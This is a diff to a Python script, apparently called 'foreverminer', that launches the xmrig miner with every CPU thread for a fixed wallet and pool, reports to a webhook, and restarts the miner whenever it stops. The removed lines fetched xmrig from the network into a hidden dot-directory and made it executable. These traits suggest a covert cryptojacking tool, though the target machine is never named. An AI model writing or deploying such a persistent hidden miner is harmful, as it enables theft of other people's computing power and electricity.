@@ -1,8 +1,6 @@
 import os
 import subprocess
 import time
-from urllib.request import urlretrieve
-import tarfile
 import requests
 
 # Configuration (Webhook and Pool Information)
@@ -11,49 +9,11 @@ WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQv
 POOL = "fr.zephyr.herominers.com:1123"  # Replace with your mining pool
 
 # Paths for xmrig
-XM_DIR = os.path.expanduser("~/.local/share/.xmrig")
+XM_DIR = "/path/to/your/repository/foreverminer/xmrig"  # Update this to the correct path where you uploaded xmrig
 XM_BIN = os.path.join(XM_DIR, "xmrig")
-TAR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
 
-# Create the directory if it does not exist
+# Ensure the directory for xmrig exists (it's where the binary is)
 os.makedirs(XM_DIR, exist_ok=True)
-
-def download_xmrig():
-    """Download and extract the miner binary."""
-    tar_path = os.path.join(XM_DIR, "xmrig.tar.gz")
-    try:
-        # Download the tarball from GitHub
-        urlretrieve(TAR_URL, tar_path)
-        with tarfile.open(tar_path, "r:gz") as tar:
-            # Extract all members while explicitly setting filter to None to avoid the warning
-            tar.extractall(path=XM_DIR)
-        
-        # Debugging: Check if xmrig exists after extraction
-        if not os.path.exists(XM_BIN):
-            notify(f"❌ XMRig binary not found after extraction at {XM_BIN}")
-            return False
-        
-        os.chmod(XM_BIN, 0o755)
-        os.remove(tar_path)  # Clean up the tarball after extraction
-        return True
-    except Exception as e:
-        notify(f"❌ XMRig download failed:\n```{e}```")
-        return False
-
-def system_info():
-    """Get system information to optimize mining setup."""
-    try:
-        import platform
-        system = platform.system()
-        if system == "Windows":
-            cpu = subprocess.getoutput("wmic cpu get caption")
-            ram = subprocess.getoutput("systeminfo | findstr /C:'Total Physical Memory'")
-        else:
-            cpu = subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip()
-            ram = subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip()
-        return {"OS": system, "CPU": cpu, "RAM": ram, "Threads": str(os.cpu_count())}
-    except Exception as e:
-        return {"error": str(e)}
 
 def start_miner(threads):
     """Start mining process with maximum threads."""
@@ -72,11 +32,34 @@ def notify(message):
     except Exception as e:
         print(f"Failed to send notification: {e}")
 
+def system_info():
+    """Get system information to optimize mining setup."""
+    try:
+        import platform
+        system = platform.system()
+        if system == "Windows":
+            cpu = subprocess.getoutput("wmic cpu get caption")
+            ram = subprocess.getoutput("systeminfo | findstr /C:'Total Physical Memory'")
+        else:
+            cpu = subprocess.getoutput("lscpu | grep 'Model name' | cut -d ':' -f2").strip()
+            ram = subprocess.getoutput("free -h | awk '/Mem/ {print $2}'").strip()
+        return {"OS": system, "CPU": cpu, "RAM": ram, "Threads": str(os.cpu_count())}
+    except Exception as e:
+        return {"error": str(e)}
+
+def is_miner_running():
+    """Check if the miner is running by inspecting active processes."""
+    try:
+        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
+        return "xmrig" in output
+    except Exception as e:
+        return False
+
 def main():
+    # Check if xmrig exists at the given path
     if not os.path.exists(XM_BIN):
-        notify("⏬ Downloading xmrig...")
-        if not download_xmrig():
-            return
+        notify(f"❌ XMRig binary not found at {XM_BIN}")
+        return
 
     # Get system information and determine available threads
     sysinfo = system_info()
@@ -96,14 +79,6 @@ def main():
         if not is_miner_running():
             notify("🔁 Miner not found. Restarting...")
             start_miner(threads)
-
-def is_miner_running():
-    """Check if the miner is running by inspecting active processes."""
-    try:
-        output = subprocess.getoutput("ps aux | grep xmrig | grep -v grep")
-        return "xmrig" in output
-    except Exception as e:
-        return False
 
 if __name__ == "__main__":
     main()
